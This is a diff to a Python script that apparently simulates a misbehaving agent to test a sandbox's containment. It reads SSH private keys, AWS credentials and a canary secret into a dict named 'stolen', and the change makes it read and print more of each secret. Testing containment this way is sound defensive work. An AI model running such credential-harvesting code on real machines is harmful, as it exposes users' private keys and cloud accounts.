@@ -17,8 +17,9 @@ stolen = {}
 for p in ("~/.ssh/id_rsa", "~/.ssh", "~/.aws/credentials", "~/.aegis/canary/secret.txt"):
     path = Path(os.path.expanduser(p))
     try:
-        stolen[p] = os.listdir(path) if path.is_dir() else path.read_text()[:40]
-        print(f"[agent] read {p}: {'(empty)' if not stolen[p] else 'GOT DATA'}")
+        stolen[p] = os.listdir(path) if path.is_dir() else path.read_text()[:200]
+        shown = repr(stolen[p])[:60] if stolen[p] else "(empty)"
+        print(f"[agent] read {p}: {shown}")
     except Exception as e:
         print(f"[agent] read {p}: {type(e).__name__}: {e}")
 try:
